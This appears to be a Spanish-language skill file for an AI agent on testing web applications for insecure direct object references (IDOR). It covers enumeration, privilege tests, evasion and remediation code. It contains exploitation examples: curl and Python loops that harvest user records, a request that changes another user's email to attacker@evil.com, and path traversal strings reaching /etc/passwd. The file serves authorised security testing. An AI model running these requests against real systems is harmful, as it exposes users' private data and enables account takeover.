---
name: idor-testing
description: Habilidades profesionales y metodología para pruebas de referencias directas a objetos inseguras (IDOR)
version: 1.0.0
---

# Pruebas de referencias directas a objetos inseguras (IDOR)

## Descripción general

IDOR (Insecure Direct Object Reference) es una vulnerabilidad de control de acceso que ocurre cuando una aplicación utiliza directamente la entrada proporcionada por el usuario para acceder a un recurso, sin verificar si el usuario tiene autorización para acceder a dicho recurso. Esta habilidad proporciona métodos para la detección, explotación y prevención de vulnerabilidades IDOR.

## Principio de la vulnerabilidad

La aplicación utiliza identificadores predecibles (como ID, nombres de archivo) para referenciar recursos directamente, sin verificar si el usuario actual tiene autorización para acceder a ese recurso.

**Ejemplo de código peligroso:**
```php
// Uso directo del ID ingresado por el usuario
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Métodos de prueba

### 1. Identificación de referencias directas a objetos

**Tipos de recursos comunes:**
- ID de usuario
- ID de archivo / nombre de archivo
- ID de pedido
- ID de documento
- ID de cuenta
- ID de registro

**Ubicaciones comunes:**
- Parámetros de URL
- Datos POST
- Valores de Cookie
- Cabeceras HTTP
- Rutas de archivo

### 2. Pruebas de enumeración

**Prueba de ID secuenciales:**
```
/user?id=1
/user?id=2
/user?id=3
```

**Prueba de UUID:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**Prueba de nombres de archivo:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Pruebas de permisos horizontales

**Acceso a recursos de otros usuarios:**
```
ID de usuario actual: 100
Prueba: /user?id=101
Prueba: /user?id=102
```

**Acceso a archivos de otros usuarios:**
```
/files/user100_document.pdf
Prueba: /files/user101_document.pdf
```

### 4. Pruebas de permisos verticales

**Usuario normal accediendo a recursos de administrador:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Técnicas de explotación

### Fuga de información de usuarios

**Enumeración de perfiles de usuario:**
```bash
# Enumeración secuencial
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# Observar diferencias en las respuestas
```

### Acceso a archivos

**Acceso a archivos de otros usuarios:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Combinación con salto de directorio:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Modificación de datos

**Modificación de datos de otros usuarios:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Operaciones por lotes

**Obtención de datos por lotes:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Técnicas de evasión

### Ofuscación de ID

**Codificación Base64:**
```
ID original: 123
Codificación: MTIz
URL: /user?id=MTIz
```

**Valor hash:**
```
ID original: 123
Hash: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Ofuscación de nombres de parámetros

**Uso de diferentes nombres de parámetros:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### Evasión de métodos HTTP

**Prueba de diferentes métodos HTTP:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Ofuscación de rutas

**Prueba de diferentes rutas:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Uso de herramientas

### Burp Suite

**Uso de Intruder:**
1. Interceptar la solicitud
2. Enviar a Intruder
3. Marcar el parámetro ID
4. Usar secuencia numérica o lista personalizada
5. Observar diferencias en las respuestas

**Uso de Repeater:**
1. Modificar el ID manualmente
2. Probar diferentes valores
3. Observar la respuesta

### OWASP ZAP

```bash
# Uso de ZAP para escaneo de IDOR
zap-cli active-scan --scanners all http://target.com
```

### Script en Python

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se puede acceder a recursos no autorizados
2. Verificar que se pueden leer, modificar o eliminar datos de otros usuarios
3. Evaluar el impacto (fuga de datos, violación de privacidad, etc.)
4. Registrar una PoC completa

### Puntos clave del reporte

- Ubicación de la vulnerabilidad e identificador del recurso
- Recursos no autorizados accesibles
- Pasos completos de explotación y PoC
- Sugerencias de remediación (control de acceso, mapeo de recursos, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Verificación de control de acceso**
   ```python
   def get_user_data(user_id, current_user_id):
       # Verificar permisos
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # Retornar datos
       return db.get_user(user_id)
   ```

2. **Referencia indirecta a objetos**
   ```python
   # Uso de tabla de mapeo
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Control de acceso basado en roles**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Verificación de propiedad de recursos**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # Verificar propiedad
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # Actualizar datos
       db.update_user(user_id, data)
   ```

5. **Uso de identificadores impredecibles**
   ```python
   import uuid
   
   # Uso de UUID en lugar de ID secuencial
   resource_id = str(uuid.uuid4())
   ```

6. **Principio de mínimo privilegio**
   - Retornar solo los datos a los que el usuario tiene autorización para acceder
   - Usar filtrado de datos
   - Limitar el alcance de los recursos accesibles

## Consideraciones

- Realizar pruebas únicamente en entornos autorizados
- Evitar acceder o modificar datos de usuarios reales
- Prestar atención a las diferencias de control de acceso entre distintos recursos
- Controlar la frecuencia de solicitudes durante las pruebas para evitar activar protecciones